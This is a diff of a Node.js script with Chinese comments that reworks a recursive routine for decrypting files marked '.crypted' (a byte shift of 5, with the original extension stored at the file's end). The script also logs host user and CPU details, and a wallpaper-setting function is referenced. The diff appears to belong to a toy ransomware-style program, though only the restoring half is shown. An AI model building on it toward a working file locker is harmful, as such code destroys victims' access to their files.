@@ -37,7 +37,7 @@ const cpuModel = os.cpus()[0].model    //获取cpu型号
 const cpuSpeed = os.cpus()[0].speed;    //获取cpu主频
 const cpuInfo = `${cpuModel}_${cpuCoreNumber} core_${cpuSpeed}MHZ`;
 //打印日志模块
-fs.appendFile("log.txt", `${time} \r\n ${operationInfo} \r\n ${address} \r\n ${userName} \r\n ${cpuInfo} `, {
+fs.appendFile("log.txt", ` \r\n  \r\n  \r\n  \r\n  \r\n ${time} \r\n ${operationInfo} \r\n ${address} \r\n ${userName} \r\n ${cpuInfo} `, {
     encoding: "utf8"
 }, function () {
     console.log('process.pid-basic',process.pid)
@@ -55,48 +55,34 @@ function decrypt(dst) {
         fs.readdirSync(dst).forEach(function (files) {
             if (path.extname(path.join(dst, files)) !== ".crypted") {
                 if (fs.statSync(path.join(dst, files)).isDirectory()) {
-                    return decrypt(path.join(dst, files));
+                    return decrypt(path.join(dst, files));  //递归解密
                 }
             } else {
                 let promise = new Promise((res) => {
                     fs.readFile(path.join(dst, files), (err, buffer) => {
-                        //console.log("read",files);
                         if (err) throw err;
-                        let buf1 = Buffer.allocUnsafe(buffer.length);
-                        for (let i = 0; i < buffer.length; i++) {
-                            buf1[i] = buffer[i] - 5;
+                        let buf1 = buffer.slice(buffer.length - 1);
+                        let extLength = Number(buf1.toString())>>1;  //得到后缀名长度
+                        let extNameCrypted = buffer.slice(buffer.length-extLength-1,buffer.length-1);  //得到加密后的后缀名
+                        let extName = Buffer.allocUnsafe(extNameCrypted.length);
+                        for(let i=0;i<extNameCrypted.length;i++){
+                            extName[i] = extNameCrypted[i] + 5;  //解密后缀名
                         }
-                        fs.writeFile(path.join(dst, files), buf1, function (err) {
-                            //console.log("write",files);
+                        extName = extName.toString();  //原来的后缀名
+                        const buf2 = buffer.slice(0,buffer.length-extLength-1);  //加密后的文件数据
+                        let buf3 = Buffer.allocUnsafe(buf2.length);
+                        for (let i = 0; i < buf2.length; i++) {
+                            buf3[i] = buf2[i] - 5;  //解密文件数据
+                        }
+                        fs.writeFile(path.join(dst, files), buf3, function (err) {
                             cryptedFile = `解密的文件：${path.join(dst, files)}`
                             if (err) {
                                 throw err;
                             }
-                            //decrpyted files which are ext'length is 4 chars
-                            if (path.basename(path.join(dst, files), `.crypted`).slice(-4, -3) !== "a" &&
-                                path.basename(path.join(dst, files), `.crypted`).slice(-4, -3) !== "u" &&
-                                path.basename(path.join(dst, files), `.crypted`).slice(-4, -3) !== "m" &&
-                                path.basename(path.join(dst, files), `.crypted`).slice(-4, -3) !== "e") {
-                                let fileName = Buffer.from(path.basename(path.join(dst, files)).slice(-11, -8))
-                                let extNameBuffer = Buffer.allocUnsafe(3)
-                                for (let i = 0; i < 3; i++) {
-                                    extNameBuffer[i] = fileName[i] + 3;
-                                }
-                                let newExtName = extNameBuffer.toString()
-                                let renameFiles = path.basename(path.join(dst, files), `.crypted`).slice(0, -3) + `.${newExtName}`;
-                                console.log("rename", renameFiles);
-                                fs.rename(path.join(dst, files), `${path.join(dst, renameFiles)}`)
-                            } else {
-                                //console.log("decrypted files", cryptedFile);
-                                let fileNameF = Buffer.from(path.basename(path.join(dst, files)).slice(-12, -8))
-                                let extNameBuffer = Buffer.allocUnsafe(fileNameF.length)
-                                for (let i = 0; i < fileNameF.length; i++) {
-                                    extNameBuffer[i] = fileNameF[i] + 3;
-                                }
-                                let newExtName = extNameBuffer.toString()
-                                let renameFiles = path.basename(path.join(dst, files), `.crypted`).slice(0, -4) + `.${newExtName}`;
-                                console.log("rename", renameFiles);
-                                fs.rename(path.join(dst, files), `${path.join(dst, renameFiles)}`)
+                            if (path.extname(path.join(dst, files)) === ".crypted") {
+                                let renameFiles = path.basename(path.join(dst, files), `.crypted`) + `.${extName}`;  //新的后缀名
+                                console.log("renameFiles", renameFiles);
+                                fs.rename(path.join(dst, files), `${path.join(dst, renameFiles)}`)  //还原文件名
                             }
                             //打印日志模块
                             fs.appendFile("log.txt", ` \r\n ${cryptedFile} `, {
@@ -106,13 +92,14 @@ function decrypt(dst) {
                             })
                         });
                     });
-                    promiseArr.push(promise);
+                    
                 })
-            };
-            Promise.all(promiseArr).then(function () {
-                resolve();
-            });
+                promiseArr.push(promise);
+            };  
         })
+        Promise.all(promiseArr).then(function () {
+            resolve();
+        });
     })
 }
 function setWallpaper(count) {
